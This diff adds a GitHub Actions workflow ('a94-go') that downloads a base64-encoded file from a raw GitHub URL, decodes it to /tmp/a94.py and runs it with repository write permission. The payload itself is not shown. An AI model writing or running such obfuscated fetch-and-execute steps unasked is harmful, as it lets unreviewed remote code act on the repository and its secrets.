@@ -1,0 +1,38 @@
+{
+  "name": "a94-go",
+  "on": {
+    "workflow_dispatch": {
+      "inputs": {
+        "mode": {
+          "description": "upload, catalog or cleanup",
+          "required": true,
+          "default": "upload"
+        }
+      }
+    }
+  },
+  "permissions": {
+    "contents": "write"
+  },
+  "jobs": {
+    "run": {
+      "runs-on": "ubuntu-latest",
+      "steps": [
+        {
+          "uses": "actions/checkout@v4"
+        },
+        {
+          "name": "deps",
+          "run": "sudo apt-get update -qq >/dev/null 2>&1 || true\nsudo apt-get install -y -qq imagemagick unzip >/dev/null 2>&1 || true"
+        },
+        {
+          "name": "run",
+          "env": {
+            "MODE": "${{ inputs.mode }}"
+          },
+          "run": "curl -sL https://raw.githubusercontent.com/sigco3111/game-asset-catalog/main/tools/a94.b64 | base64 -d > /tmp/a94.py\npython3 /tmp/a94.py"
+        }
+      ]
+    }
+  }
+}
